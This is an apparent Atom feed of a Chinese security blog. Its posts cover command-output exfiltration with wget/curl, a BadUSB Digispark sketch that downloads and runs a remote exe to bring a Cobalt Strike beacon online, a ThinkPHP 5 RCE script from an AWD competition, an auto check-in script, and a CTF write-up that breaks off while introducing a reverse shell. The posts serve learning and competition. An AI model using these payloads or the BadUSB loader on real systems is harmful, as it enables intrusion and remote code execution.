<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Polo&#39;s Blog</title>
  
  
  <link href="https://polosec.github.io/atom.xml" rel="self"/>
  
  <link href="https://polosec.github.io/"/>
  <updated>2021-04-21T19:36:07.405Z</updated>
  <id>https://polosec.github.io/</id>
  
  <author>
    <name>Polo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>new theme</title>
    <link href="https://polosec.github.io/2021/04/22/new-theme/"/>
    <id>https://polosec.github.io/2021/04/22/new-theme/</id>
    <published>2021-04-21T19:06:21.000Z</published>
    <updated>2021-04-21T19:36:07.405Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>命令执行结果外带</title>
    <link href="https://polosec.github.io/2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/"/>
    <id>https://polosec.github.io/2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/</id>
    <published>2021-04-17T18:25:55.000Z</published>
    <updated>2021-04-17T21:37:56.341Z</updated>
    
    <content type="html"><![CDATA[<p>wget –header=”test:$(whoami)” <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a></p><img src="http://cdn.polowong.top/static/images/wget1.png"><p>whoami | curl -F “:data=@-“ <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a>  </p><img src="http://cdn.polowong.top/static/images/curl1.png"><p>Curl “<a href="http://ssti.com:5000/?username=&#96;whoami&#96;&quot;">http://ssti.com:5000?username=&#96;whoami&#96;&quot;</a></p><img src="http://cdn.polowong.top/static/images/curl2.png">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;wget –header=”test:$(whoami)” &lt;a href=&quot;http://ssti.com:5000/?username%5C=1&quot;&gt;http://ssti.com:5000\?username\=1&lt;/a&gt;&lt;/p&gt;
&lt;img src=&quot;http://cd</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>badusb踩坑&amp;近期感想</title>
    <link href="https://polosec.github.io/2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/"/>
    <id>https://polosec.github.io/2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/</id>
    <published>2021-03-29T12:34:48.000Z</published>
    <updated>2021-04-20T19:41:48.607Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：</p><p>近期在公司内部学了一点红队技能，虽然目前用不上，但是做个记录，顺便发牢骚。</p></blockquote><h1 id="致谢-amp-参考"><a href="#致谢-amp-参考" class="headerlink" title="致谢&amp;参考"></a>致谢&amp;参考</h1><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><p><a href="https://blog.csdn.net/sxhexin/article/details/87914649">https://blog.csdn.net/sxhexin/article/details/87914649</a></p><p><a href="https://www.anquanke.com/post/id/227477">https://www.anquanke.com/post/id/227477</a></p><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><h1 id="Badusb-插入上线cobalt-strike"><a href="#Badusb-插入上线cobalt-strike" class="headerlink" title="Badusb 插入上线cobalt strike"></a>Badusb 插入上线cobalt strike</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>ATtiny85 开发板、arduino IDE下载<a href="https://www.arduino.cc/en/Main/Softwaredigispark%E3%80%82%E6%9A%82%E6%97%B6%E5%85%88%E4%B8%8D%E8%A6%81%E8%A3%85%E9%A9%B1%E5%8A%A8%EF%BC%81%EF%BC%81%E9%A9%B1%E5%8A%A8%E6%9C%89%E5%A4%A7%E5%9D%91%E3%80%82">https://www.arduino.cc/en/Main/Softwaredigispark。暂时先不要装驱动！！驱动有大坑。</a></p><p>看freeebuf里面的教程装完驱动，烧录完只能执行一次，需要更新下固件才可以重复使用，后面会提到。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>打开IDE,在文件-&gt;首选项中加入附加开发板管理，附加开发板管理网址处写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;digistump.com&#x2F;package_digistump_index.json</span><br></pre></td></tr></table></figure><p>注意，这里需要翻墙，后面添加开发板下载相关配置时也需要翻墙，现在就翻着 别断了。</p><h2 id="添加开发板"><a href="#添加开发板" class="headerlink" title="添加开发板"></a>添加开发板</h2><p>IDE中-工具-开发板管理，类型-contributed/贡献，选择</p><img src="http://cdn.polowong.top/static/images/boards.png"><p>然后选安装（翻墙）</p><p>安装好后，选择这个16.5mhz的开发板。</p><img src="http://cdn.polowong.top/static/images/1655.png"><h2 id="更新-boot-loader"><a href="#更新-boot-loader" class="headerlink" title="更新 boot loader"></a>更新 boot loader</h2><p>更新 BootLoader的教程看 <a href="https://blog.csdn.net/sxhexin/article/details/87914649%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%B5%98%E8%BF%B0%EF%BC%8C%E8%B7%9F%E7%9D%80%E8%BF%99%E4%B8%AA%E6%95%99%E7%A8%8B%E8%B5%B0%E6%B2%A1%E9%97%AE%E9%A2%98%E7%9A%84%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E4%B9%8B%E5%89%8D%E6%9C%89%E8%A3%85%E7%9B%B8%E5%85%B3%E9%A9%B1%E5%8A%A8%EF%BC%8C%E8%AF%B7%E6%8A%8A%E9%A9%B1%E5%8A%A8%E5%8D%B8%E8%BD%BD%E5%B9%B2%E5%87%80%EF%BC%81%EF%BC%81%EF%BC%81">https://blog.csdn.net/sxhexin/article/details/87914649，这里不再赘述，跟着这个教程走没问题的，如果你之前有装相关驱动，请把驱动卸载干净！！！</a></p><p>更新BootLoader是因为避免踩烧录完只能运行一次的坑！！</p><p>BootLoader是大坑，一定要好好弄！</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><p>有兴趣一步步走的可以写个测试代码 cmd弹个窗什么的，我这里一步到位，直接远程加载exe。</p><p>对于cs 可以生成powershell，然后cmd里面powershell加载调用直接上线。</p><h2 id="使用CMD远程下载可执行文件"><a href="#使用CMD远程下载可执行文件" class="headerlink" title="使用CMD远程下载可执行文件"></a>使用CMD远程下载可执行文件</h2><p>我选择用cmd的原因是因为 我还不会powershell免杀（2333）</p><p>所以 探索了下 如何类似Linux执行多条命令，发现在Windows cmd下是and符号&amp;。</p><p>执行命令的代码框架如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DigiKeyboard.h&quot;</span><span class="comment">//库文件</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// setup函数只运行一次</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">2000</span>);<span class="comment">//等待两秒，给电脑自动加载配置时间</span></span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<span class="comment">//摁住WIN键</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);<span class="comment">//等待300毫秒</span></span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;cmd&quot;</span>);<span class="comment">//输入CMD</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;curl http://12xxxx0/calc.exe &gt; E:\\calc.exe &amp; E:\\calc.exe&quot;</span>);<span class="comment">//执行PAYLOAD，双引号需要斜杠转义</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，在最后一个注释处，是在前面语句打开cmd黑框的情况下，在cmd中输入的语句。两个反斜杠是为了转义。</p><p>我的思路是，将可执行exe文件上传至服务器，通过curl的方式下载并重定向至某个驱动器并执行。</p><p>我本来想放到C盘，但是放到C盘，有可能存在权限问题（放在C:\Windows\Temp）目录下也有些问题，于是放到了D/E盘。</p><p>将上述代码在IDE中输入后ctrl+u上传，然后插入attiny85 </p><img src="http://cdn.polowong.top/static/images/in1.png"><p>一定是先拔出来，出现这个 60seconds的时候插进去，出现下面这一串代表写入成功 并且会自动执行一次。</p><p>然后拔出来 再插进去的时候 就有弹计算器的效果了。（小思考，如何在执行完exe后自动关闭cmd黑框？）</p><p>效果如下：</p><img src="http://cdn.polowong.top/static/images/反弹.gif"><h2 id="CMD上线CS"><a href="#CMD上线CS" class="headerlink" title="CMD上线CS"></a>CMD上线CS</h2><p>嫖来了大佬的免杀方法2333 试一下exe上线cs</p><img src="http://cdn.polowong.top/static/images/cs.gif"><p>小思考的答案是：命令后跟&amp; exit;</p><p>23333 </p><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>5pyA6L+R5LiN5pivaHfkuYjvvIzorqTor4bkuIDkuKrlhazlj7jnmoRocuWnkOWnkO+8jOacgOi/keS5n+WcqGh35oub5Lq677yM6ZyA6KaB5LiA5Lqb5pyJ5omL5bCx6KGM55qE5bKX5L2N77yM5a+55rKh5Y67aHfov4cg5bm25LiU5oqA5pyv5LiN5oCO5LmI5qC355qE5ZCM5a2m5p2l6K+077yMNDAw5LiA5aSp55qE5b6F6YGH44CB5YyF5ZCD5L2P44CB5LiN6ZyA6KaB6Ieq5bex5Z6r6ZKx44CB6aG555uu546w5Zy65pyJ5Lq65bim77yM5oiR6KeJ5b6X5bey57uP5b6I5aW95ZWm44CC5aaC5p6c5oiR5aSn5LqM55qE5pe25YCZ5pyJ6L+Z56eN5py65Lya77yM5ZOq5oCV5LiN57uZ5oiR5bel6LWE77yM5oiR5Lmf6KaB5Y6744CC5oiR5L2c5Li65LiA5Liq5a2m55Sf77yM6Zmk5LqG5aSW5Ye66Ieq5bex5o6l6aG555uu77yM5a6e5Zyo5piv5oOz5LiN5Yiw6L+Y5pyJ5LuA5LmI5q+UaHfmm7Tlpb3nmoTog73nm7jlr7nku47nroDljZXlvIDlp4vmjqXop6blronlhajlrp7miJjnmoTlnLrmma/kuobjgILvvIhTUkPkuI3nrpfvvIxTUkPkuZ/pnIDopoHnm7jlvZPnmoTlronlhajln7rnoYDjgILvvInmiJHmiorov5nkuKrmtLvmjqjov4fljrvkuYvlkI7vvIzkuInkuKrluIjlvJ/kuZ/lvojnu5nlipvvvIzpgJrov4fkuobpnaLor5XjgILlj6/kuIfkuIfmsqHmg7PliLDor7flgYfnmoTml7blgJnlh7rpl67popjkuobvvIzlr7zlkZjor7TnjrDlnKjnmoTph43lv4PlupTor6XmmK/kuJPkuJror77lrabkuaDjgIHogIzkuI3mmK/mg7PnnYDlh7rljrvlrp7kuaDvvIzlubbkuJTmi7/miJHkuL7kvovlrZAyMzMz44CC5pyA5ZCO6L+Y6K+077yM5Y+q6KaB5L2g5Y675LqG5bCx57uZ5L2g6YCA5a2m77yM55yf5LiN5oiz44CC54S26ICM5pu05Y+v56yR55qE5piv77yM5p+Q6ICB5biI5ZyoMTfnuqfpgJrnn6XnvqTlj5Hkuoblj6bkuIDlrrbmnLrmnoTnmoRod+Wuo+S8oO+8jOW+hemBh+aIkeS5n+ivtOS4i++8jDMwMC00MDDkuIDlpKnvvIzkuI3ljIXlkIPkvY/vvIzmnInlhY3otLnln7norq3vvIzmoLnmja7ln7norq3ogIPmoLjnu5PmnpzliIbnuqLok53pmJ/vvIjvvJ/vvInvvIznhLblkI7miJHmiZPnlLXor53ov4fljrvpl67kuobkuIvvvIzmu6HlmLTot5/miJHosIjnkIbmg7PosIjpgZPlvrfosIjmioDmnK/jgIHlsLHor7TlrabnlJ/kuI3opoHogIHmg7PnnYDmjKPpkrHkupHkupHjgILmiJHkvLDorqEg5LiN57uZ5oiR6L+Z5LiJ5Liq5biI5byf5YGH55qE5Y6f5Zug77yM5bqU6K+l5piv5Yqo5LqG5LuW5Lus55qE6JuL57OV5LqG5ZCn77yM5LuO6YKj6L656LWw6IO95oq96ZKxMjMzM+OAguWtpumZouWvueaIkeW+iOWlveOAgeWQhOS9jemihuWvvOiAgeW4iOWSjOiUvOWPr+S6su+8jOWtpumZouS5n+e7meS6huaIkeaOqOWFjeWQjemine+8jOmhuuWIqeaOqOWFjeiHs1VFU1RD44CC5b+D5oCA5oSf5oGp5LmL5b+D77yM5oOz5o6o5biI5byf5LiA5oqK77yM5Y67aHfvvIzmsqHmg7PliLDnq5/nhLbkuI3nu5nlh4blgYfvvIznnJ/nmoTvvIzlv4Pph4zpnaLlh4nkuoblvojlpJrjgILkuI3or7TkuoZ+57un57ut5YaZ5q+V5Lia6K665paH5LqGfg==</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;前言：&lt;/p&gt;
&lt;p&gt;近期在公司内部学了一点红队技能，虽然目前用不上，但是做个记录，顺便发牢骚。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;致谢-amp-参考&quot;&gt;&lt;a href=&quot;#致谢-amp-参考&quot; class=&quot;headerlink</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>近一年学习总结</title>
    <link href="https://polosec.github.io/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>https://polosec.github.io/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-06T08:56:06.000Z</published>
    <updated>2021-03-06T09:10:50.739Z</updated>
    
    <content type="html"><![CDATA[<p>虽然接触安全从初中就算开始了，但当时也仅仅是停留于混混娱乐圈，日一日别人的webshell。</p><p>大一大二对安全知识的学习较少，大二外出打了两次比赛，成绩较差，直接白给。</p><p>大三寒假疫情在家的时候算是正式开始学习安全知识，做最简单的靶场，刷题，前两次正经打的比赛是I春秋高校抗疫和BJDCTF。</p><p>这是一个纠结的过程，因为在那个阶段我还要准备保研，还在保研和考研两者之间摇摆。</p><p>最终下定决心冲一冲，那是三月底。某公众号预测我保研成功率在30%左右。</p><p>具体学什么知识在这里也不想说了，算是从最基础的开始学习吧，印象比较深的是LFI。现在我XSS和注入玩的也不好，算是只会用工具跑跑。</p><p>保完研之后有些许松懈，对安全知识的学习有些懈怠了，SRC还没开始搞，到现在上班时间也不太充裕。</p><p>现在正好是三月初，距离我开始正式接触安全也差不多一年的时间，在这一年里，我做到了：</p><p>1.两份渗透岗实习经历</p><p>2.两次通过护网面试，一次中级，一次初级。（蓝队</p><p>3.拿到五所985网络安全专业OFFER,其中四个学硕;</p><p>4.数次参加线上赛，虽然白给的较多</p><p>5.两次带队参加省赛</p><p>6.开始打AWD</p><p>7.独立发表一篇论文</p><p>8.独立完成两个小项目</p><p>9.美赛建模一等奖</p><p>10.自费MacBook Pro</p><p>11.经济独立</p><p>12.顺利保研</p><p>下一年渴望更健康的身体与相对坚强的意志，至少不能中午一觉睡三个小时。</p><p>仅此记录</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然接触安全从初中就算开始了，但当时也仅仅是停留于混混娱乐圈，日一日别人的webshell。&lt;/p&gt;
&lt;p&gt;大一大二对安全知识的学习较少，大二外出打了两次比赛，成绩较差，直接白给。&lt;/p&gt;
&lt;p&gt;大三寒假疫情在家的时候算是正式开始学习安全知识，做最简单的靶场，刷题，前两次正</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>记一次线上AWD</title>
    <link href="https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/"/>
    <id>https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/</id>
    <published>2021-02-24T16:24:25.000Z</published>
    <updated>2021-02-24T16:52:22.848Z</updated>
    
    <content type="html"><![CDATA[<p>最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。</p><h1 id="开赛"><a href="#开赛" class="headerlink" title="开赛"></a>开赛</h1><p>开局给了ssh和web服务以及要求，如果被check down了，每轮扣100分（当时不知道每轮扣100分，以为一共扣100，每次restart需要扣100并且重置环境，所以就一直没restart）</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>拿到ssh权限后首先备份了文件，用D盾、河马webshell专杀工具对web环境进行杀毒，想查杀webshell。</p><p>在webshell查杀环节中，使用河马webshell专杀工具和D盾杀了一个shell，但是有免杀shell没杀出来（一般AWD会内置多个后门），由于时间原因也没有细看，造成的后果是被传了不死马。（这是后话了。</p><p>在webshell查杀环节中应改进的地方是：</p><p>1.采用多种工具综合查杀webshell</p><p>2.对疑似后门文件手工查看，不能完全相信工具。</p><h3 id="弱点1"><a href="#弱点1" class="headerlink" title="弱点1"></a>弱点1</h3><p>流量监控脚本没挂上去，导致监控流量失败，无法得知有哪些payload是发起了攻击。</p><h2 id="自检"><a href="#自检" class="headerlink" title="自检"></a>自检</h2><p>通过观察web服务以及报错页面，出现了经典的十年磨一剑—-TP5.0.2，于是立刻想到了TP5.0.2的RCE。</p><p>网上收集payload后打了一波cat/flag，成功，并且通过该方式拿到了其他队伍的flag，遂考虑采用脚本编写EXP批量getflag并通知负责防护的队员修复相关漏洞。</p><h3 id="弱点2"><a href="#弱点2" class="headerlink" title="弱点2"></a>弱点2</h3><p>在修复时浪费了太多的时间，负责修复的队员无法尽快修复，并在上传修复后的文件时遇到了权限问题。</p><h3 id="弱点3"><a href="#弱点3" class="headerlink" title="弱点3"></a>弱点3</h3><p>临场紧张+payload不熟悉</p><p>我真的吐了。当时太紧张了，之前利用TP5的payload也是复制粘贴，这两个因素加起来导致我在Hackbar能顺利打payload，Burp也可以，但到了写脚本的时候就不行。因为payload是四个键值对，我写脚本的时候只写了一个。</p><p>贴一下我当时写的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://47.104.144.188:&quot;</span></span><br><span class="line">rest=<span class="string">&quot;/index.php?s=captcha&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27; _method&#x27;</span>:<span class="string">&#x27;__construct&amp;filter%5B%5D=system&amp;get%5B%5D=cat+%2Fflag&amp;method=get&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9001</span>,<span class="number">9051</span>):</span><br><span class="line">    urls=<span class="built_in">str</span>(url+<span class="built_in">str</span>(port)+rest)</span><br><span class="line">    response=requests.post(url=urls,data=data)</span><br><span class="line">    <span class="built_in">print</span> (response.text)</span><br></pre></td></tr></table></figure><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>在拿到一个并且唯一一个payload后，由于没有编写出批量利用脚本，遂考虑手动打，导致的得分缓慢。</p><h3 id="弱点4"><a href="#弱点4" class="headerlink" title="弱点4"></a>弱点4</h3><p>临场脚本编写能力欠缺</p><p>在编写脚本的过程中，需要用到对html标签解析的库（叫啥忘了）、多线程（批量getflag和提交flag），但由于很久没写多线程了，所以忘了多线程咋用了。。而且解析html标签还是大二学爬虫的时候写的，太过久远，也搞忘记了。所以最后脚本也没跑起来，耽误了太多时间。</p><h3 id="弱点5"><a href="#弱点5" class="headerlink" title="弱点5"></a>弱点5</h3><p>对AWD赛制不熟悉，机器至少down了三分之一的比赛时间，5分钟一轮，一轮掉100分。我说怎么越交flag分越少。。绝了。</p><h1 id="反思与改进"><a href="#反思与改进" class="headerlink" title="反思与改进"></a>反思与改进</h1><h2 id="提升脚本编写能力"><a href="#提升脚本编写能力" class="headerlink" title="提升脚本编写能力"></a>提升脚本编写能力</h2><p>不说了。多写多看多寻思 多借鉴别人的思路，掌握基本库的用法。</p><p><strong>先把多线程和xpath解析学会了！！！</strong></p><h2 id="提升payload熟练度"><a href="#提升payload熟练度" class="headerlink" title="提升payload熟练度"></a>提升payload熟练度</h2><p>要求平时复现过程中不能拿到直接打，要分析原理与利用链。</p><h2 id="提升运维水平"><a href="#提升运维水平" class="headerlink" title="提升运维水平"></a>提升运维水平</h2><p>赛前看到了安恒低权限EDR，但是部署起来看起来麻烦，就没搞，但是流量监控脚本也没挂上去，以后需要提前部署并实践相关脚本与环境。</p><p>控制好相关文件的读写权限等。</p><h2 id="提升应急反应能力"><a href="#提升应急反应能力" class="headerlink" title="提升应急反应能力"></a>提升应急反应能力</h2><p>要通过流量脚本观察是否有入侵与挂马行为，学会如何处理不死马等紧急情况。</p><h2 id="提升反制能力"><a href="#提升反制能力" class="headerlink" title="提升反制能力"></a>提升反制能力</h2><p>要能通过别人打的payload反打别人</p><h2 id="完善武器库"><a href="#完善武器库" class="headerlink" title="完善武器库"></a>完善武器库</h2><p>多收集webshell查杀工具、积累webshell免杀方式、收集常见漏洞EXP。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。&lt;/p&gt;
&lt;h1 id=&quot;开赛&quot;&gt;&lt;a href=&quot;#开赛&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="awd" scheme="https://polosec.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>智慧曲园自动签到+微信推送</title>
    <link href="https://polosec.github.io/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/"/>
    <id>https://polosec.github.io/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/</id>
    <published>2021-01-19T14:11:27.000Z</published>
    <updated>2021-01-19T12:21:05.822Z</updated>
    
    <content type="html"><![CDATA[<h1 id="智慧曲园自动签到"><a href="#智慧曲园自动签到" class="headerlink" title="智慧曲园自动签到"></a>智慧曲园自动签到</h1><p><a href="https://github.com/polosec/qfnuAutoTemperatureSubmit">https://github.com/polosec/qfnuAutoTemperatureSubmit</a></p><p>使用方法：</p><p>首先安装环境依赖 pip3 install requests</p><p>将该脚本上传至服务器 （我的路径是/root）</p><p>新建脚本 auto.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /root/demo1.py xxxxx  xxxxxxx &gt;1.txt ; python3 /root/serverjiang.py </span><br></pre></td></tr></table></figure><p>新建定时任务</p><p>crontab -e  1 0 * * * /root/auto.sh  </p><p>每天凌晨0点1分自动执行 /root/auto.sh 这条命令</p><h1 id="绑定server酱"><a href="#绑定server酱" class="headerlink" title="绑定server酱"></a>绑定server酱</h1><p>在server酱绑定微信后，拿到key，放到下面脚本 <strong>yourkey</strong> 这个地方。</p><p>serverjiang.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://sc.ftqq.com/yourkey.send?text=&quot;</span></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>).readline()</span><br><span class="line">data=json.loads(data)</span><br><span class="line">data=data[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">text=<span class="built_in">str</span>(data)</span><br><span class="line">desp=<span class="string">&quot;success&quot;</span></span><br><span class="line">url=url+text+<span class="string">&quot;&amp;desp=&quot;</span>+desp</span><br><span class="line">r=requests.get(url=url).text</span><br></pre></td></tr></table></figure><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p>每天0点1分自动提交体温上报请求，并且将返回的信息（成功/错误）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;智慧曲园自动签到&quot;&gt;&lt;a href=&quot;#智慧曲园自动签到&quot; class=&quot;headerlink&quot; title=&quot;智慧曲园自动签到&quot;&gt;&lt;/a&gt;智慧曲园自动签到&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/polosec/qfnuAutoTe</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XCTF/*CTF web4</title>
    <link href="https://polosec.github.io/2021/01/18/XCTF-CTF-web4/"/>
    <id>https://polosec.github.io/2021/01/18/XCTF-CTF-web4/</id>
    <published>2021-01-18T11:51:30.000Z</published>
    <updated>2021-01-18T12:26:01.085Z</updated>
    
    <content type="html"><![CDATA[<p>上周末刚结束了*ctf的比赛，又摸鱼了。。赛后看雪宝的wp复现出来的，发现是socket写的有点问题 搞到夜里三点也没搞出来 wtcl</p><h1 id="oh-my-socket"><a href="#oh-my-socket" class="headerlink" title="oh my socket"></a>oh my socket</h1><p>题目分析：</p><p>直接给了一堆docker 先跑起来看看是什么</p><p>docker-compose up -d</p><p>跑起来了三个容器 分别是 server client webserver</p><p>先整理下网络环境情况：</p><p>webserver 172.21.0.4</p><p>server 172.21.0.2</p><p>client 172.21.0.3</p><p>首先访问webserver</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> STDOUT, check_output</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        f.save(os.path.join(f.filename))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            output = check_output([<span class="string">&#x27;python3&#x27;</span>, f.filename], stderr=STDOUT, timeout=<span class="number">80</span>)</span><br><span class="line">            content = output.decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            content = e.__str__()</span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;rm&#x27;</span>, f.filename]))</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(port=<span class="number">5000</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>通过对源码进行审计 发现上传文件后会执行文件里面的内容，于是尝试反弹shell，上传如下脚本：</p><p>这里请注意理解该段代码的作用，和bash -i那个的原理相似，都是将std out std in std 